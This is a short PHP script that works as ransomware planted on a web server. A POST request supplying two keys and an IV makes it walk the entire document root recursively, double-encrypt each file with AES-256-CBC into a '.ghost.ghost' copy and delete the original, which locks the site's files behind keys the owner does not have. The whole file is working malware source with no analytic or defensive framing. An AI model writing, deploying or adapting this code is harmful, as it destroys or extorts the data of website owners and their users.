<?php
function encrypt_decrypt($action, $string, $secret_key, $secret_iv) { //Credits to some website which isn't up right now
    $output = false;

    $encrypt_method = "AES-256-CBC";

    $key = hash('sha256', $secret_key);

    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    if( $action == 'encrypt' ) {
        return base64_encode(openssl_encrypt($string, $encrypt_method, $key, 0, $iv));
    }
    else if( $action == 'decrypt' ){
        return openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }
}

function encfile($filename){
	if (strpos($filename, '.ghost.ghost') !== false) {
    return;
	}
	file_put_contents($filename.".ghost.ghost", (encrypt_decrypt('encrypt', (encrypt_decrypt('encrypt', file_get_contents($filename), $_POST['key1'], $_POST['iv'])), $_POST['key2'], $_POST['iv'])));
	unlink($filename);
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			}else {
				encfile($dir."/".$file);
		}
	}
}

if(isset($_POST['key1']) && isset($_POST['key2']) && isset($_POST['iv'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
?>
